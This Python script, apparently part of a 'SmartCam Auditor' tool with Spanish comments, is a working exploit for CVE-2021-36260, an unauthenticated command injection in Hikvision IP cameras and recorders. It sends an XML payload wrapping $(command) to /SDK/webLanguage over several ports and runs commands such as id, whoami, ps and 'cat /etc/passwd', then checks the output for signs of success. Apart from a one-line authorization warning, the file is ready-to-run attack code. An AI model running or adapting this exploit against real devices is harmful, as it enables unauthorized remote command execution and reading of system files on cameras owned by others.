#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SmartCam Auditor - Exploit CVE-2021-36260 para Hikvision
M√≥dulo espec√≠fico para el exploit de command injection en c√°maras Hikvision
"""

import requests
import urllib3
from datetime import datetime

# Deshabilitar advertencias SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(ip, port=80, timeout=10):
    """
    Exploit principal para CVE-2021-36260 - Command injection en Hikvision
    
    Args:
        ip (str): IP del dispositivo Hikvision
        port (int): Puerto del servicio web (default: 80)
        timeout (int): Timeout para las conexiones (default: 10)
    
    Returns:
        dict: Resultado del exploit con informaci√≥n detallada
    """
    
    # Endpoint vulnerable conocido
    endpoint = "/SDK/webLanguage"
    
    # Comandos a probar ordenados por utilidad
    test_commands = [
        "id",                    # Informaci√≥n b√°sica del usuario
        "whoami",               # Usuario actual
        "uname -a",             # Informaci√≥n del sistema
        "cat /etc/passwd",      # Usuarios del sistema
        "ls -la /",             # Listado del directorio ra√≠z
        "ps aux",               # Procesos en ejecuci√≥n
    ]
    
    print(f"[*] Iniciando exploit CVE-2021-36260 contra {ip}:{port}")
    print(f"[*] Endpoint objetivo: {endpoint}")
    
    # Probar diferentes protocolos y puertos
    protocols = ['http', 'https']
    ports_to_try = [port, 80, 8080, 443] if port != 80 else [80, 8080, 443]
    
    for protocol in protocols:
        for test_port in ports_to_try:
            url = f"{protocol}://{ip}:{test_port}{endpoint}"
            
            print(f"[*] Probando: {url}")
            
            for command in test_commands:
                result = _send_payload(url, command, timeout)
                
                if result['success']:
                    print(f"[+] ¬°√âXITO! Comando '{command}' ejecutado en {url}")
                    
                    # Preparar resultado detallado
                    exploit_result = {
                        'vulnerable': True,
                        'success': True,
                        'ip': ip,
                        'port': test_port,
                        'protocol': protocol,
                        'endpoint': endpoint,
                        'url': url,
                        'command_executed': command,
                        'server_response': result['response'][:1000],  # Limitar respuesta
                        'payload_used': result['payload'],
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'cve': 'CVE-2021-36260',
                        'severity': 'CRITICAL',
                        'evidence': result.get('evidence', {}),
                        'headers': result.get('headers', {})
                    }
                    
                    # Intentar ejecutar comandos adicionales para m√°s evidencia
                    additional_commands = [cmd for cmd in test_commands if cmd != command][:3]
                    additional_results = []
                    
                    for extra_cmd in additional_commands:
                        extra_result = _send_payload(url, extra_cmd, timeout)
                        if extra_result['success']:
                            additional_results.append({
                                'command': extra_cmd,
                                'output': extra_result['response'][:300],
                                'evidence': extra_result.get('evidence', {})
                            })
                    
                    if additional_results:
                        exploit_result['additional_commands'] = additional_results
                    
                    return exploit_result
    
    # Si llegamos aqu√≠, no fue vulnerable
    print(f"[-] {ip} no parece vulnerable a CVE-2021-36260")
    
    return {
        'vulnerable': False,
        'success': False,
        'ip': ip,
        'port': port,
        'endpoint': endpoint,
        'cve': 'CVE-2021-36260',
        'message': 'Target no vulnerable o exploit fall√≥',
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'attempts': len(protocols) * len(ports_to_try) * len(test_commands)
    }

def _send_payload(url, command, timeout=10):
    """
    Env√≠a el payload XML al endpoint vulnerable
    
    Args:
        url (str): URL completa del endpoint
        command (str): Comando a ejecutar
        timeout (int): Timeout para la conexi√≥n
    
    Returns:
        dict: Resultado del env√≠o del payload
    """
    
    # Payload XML para command injection
    payload = f"<?xml version='1.0' encoding='UTF-8'?><language>$({command})</language>"
    
    headers = {
        "Content-Type": "application/xml",
        "User-Agent": "SmartCam-Auditor/2.0",
        "Accept": "*/*",
        "Connection": "close"
    }
    
    try:
        response = requests.post(
            url,
            data=payload,
            headers=headers,
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        
        response_text = response.text
        
        # Analizar la respuesta para detectar ejecuci√≥n de comando
        evidence = _analyze_response(response_text, command)
        
        if evidence['detected']:
            return {
                'success': True,
                'response': response_text,
                'payload': payload,
                'headers': dict(response.headers),
                'status_code': response.status_code,
                'evidence': evidence
            }
        else:
            return {
                'success': False,
                'response': response_text,
                'payload': payload,
                'status_code': response.status_code,
                'reason': 'No command execution evidence found'
            }
    
    except requests.exceptions.Timeout:
        return {
            'success': False,
            'error': 'Timeout',
            'payload': payload,
            'reason': 'Connection timeout'
        }
    except requests.exceptions.ConnectionError:
        return {
            'success': False,
            'error': 'Connection Error',
            'payload': payload,
            'reason': 'Connection failed'
        }
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'payload': payload,
            'reason': f'Unexpected error: {str(e)}'
        }

def _analyze_response(response_text, command):
    """
    Analiza la respuesta del servidor para detectar evidencia de ejecuci√≥n de comando
    
    Args:
        response_text (str): Respuesta del servidor
        command (str): Comando que se intent√≥ ejecutar
    
    Returns:
        dict: Informaci√≥n sobre la evidencia encontrada
    """
    evidence = {
        'detected': False,
        'indicators': [],
        'confidence': 0,
        'command_type': command
    }
    
    if not response_text or len(response_text.strip()) < 3:
        return evidence
    
    response_lower = response_text.lower()
    
    # Patrones espec√≠ficos por comando
    command_patterns = {
        'id': ['uid=', 'gid=', 'groups='],
        'whoami': ['root', 'admin', 'user', 'daemon'],
        'uname': ['linux', 'gnu', 'kernel', 'version'],
        'cat /etc/passwd': ['root:', 'daemon:', 'bin:', 'sys:', ':0:0:', ':/bin/', ':/sbin/'],
        'ls': ['total ', 'drwx', '-rw-', 'bin', 'etc', 'var', 'usr', 'tmp'],
        'ps': ['pid', 'ppid', 'cmd', 'command', 'process']
    }
    
    # Buscar patrones espec√≠ficos del comando
    if command in command_patterns:
        patterns = command_patterns[command]
        found_patterns = [p for p in patterns if p in response_lower]
        
        if found_patterns:
            evidence['detected'] = True
            evidence['indicators'] = found_patterns
            evidence['confidence'] = min(len(found_patterns) * 30, 100)
    
    # Patrones generales de ejecuci√≥n exitosa
    general_patterns = [
        'uid=', 'gid=',     # id command output
        'root:', 'bin:',    # /etc/passwd content
        'total ', 'drwx',   # ls command output
        'linux', 'kernel',  # uname output
        'pid', 'ppid'       # ps command output
    ]
    
    general_found = [p for p in general_patterns if p in response_lower]
    if general_found and not evidence['detected']:
        evidence['detected'] = True
        evidence['indicators'] = general_found
        evidence['confidence'] = min(len(general_found) * 25, 85)
    
    # Detectar posible shell output por formato
    if not evidence['detected']:
        lines = response_text.strip().split('\n')
        if len(lines) > 1:
            non_empty_lines = [l for l in lines if l.strip()]
            if len(non_empty_lines) >= 2:
                evidence['detected'] = True
                evidence['indicators'] = ['multi_line_output']
                evidence['confidence'] = 50
    
    return evidence

def quick_test(ip):
    """
    Prueba r√°pida para verificar si el dispositivo es vulnerable
    
    Args:
        ip (str): IP del dispositivo
    
    Returns:
        bool: True si es vulnerable, False en caso contrario
    """
    result = exploit(ip, timeout=5)
    return result.get('vulnerable', False)

def get_exploit_info():
    """
    Retorna informaci√≥n sobre el exploit
    
    Returns:
        dict: Informaci√≥n del exploit
    """
    return {
        'cve': 'CVE-2021-36260',
        'name': 'Hikvision Command Injection',
        'description': 'Unauthenticated command injection in Hikvision IP cameras',
        'severity': 'CRITICAL',
        'cvss_score': 9.8,
        'affected_products': [
            'Hikvision IP Cameras',
            'Hikvision DVRs',
            'Hikvision NVRs'
        ],
        'endpoint': '/SDK/webLanguage',
        'method': 'POST',
        'payload_type': 'XML Command Injection'
    }

if __name__ == "__main__":
    # Ejemplo de uso
    import sys
    
    if len(sys.argv) != 2:
        print("Uso: python hikvision_cve2021_36260.py <IP>")
        print("Ejemplo: python hikvision_cve2021_36260.py 192.168.1.10")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    
    print(f"üéØ Probando exploit CVE-2021-36260 en {target_ip}")
    print("‚ö†Ô∏è  ADVERTENCIA: Solo usar en dispositivos propios o con autorizaci√≥n")
    print()
    
    resultado = exploit(target_ip)
    
    print("\nüìä RESULTADO:")
    print("=" * 50)
    
    if resultado['vulnerable']:
        print(f"‚úÖ {target_ip} es VULNERABLE a CVE-2021-36260!")
        print(f"üì§ Comando ejecutado: {resultado.get('command_executed', 'N/A')}")
        print(f"üîó URL vulnerable: {resultado.get('url', 'N/A')}")
        
        if resultado.get('server_response'):
            print("\nüìÑ Respuesta del servidor:")
            print("-" * 30)
            print(resultado['server_response'][:300])
            if len(resultado['server_response']) > 300:
                print("...")
            print("-" * 30)
        
    else:
        print(f"‚ùå {target_ip} NO vulnerable o exploit fall√≥")
        print(f"üìù Intentos realizados: {resultado.get('attempts', 'N/A')}")
    
    print(f"\nüïí Timestamp: {resultado.get('timestamp', 'N/A')}")
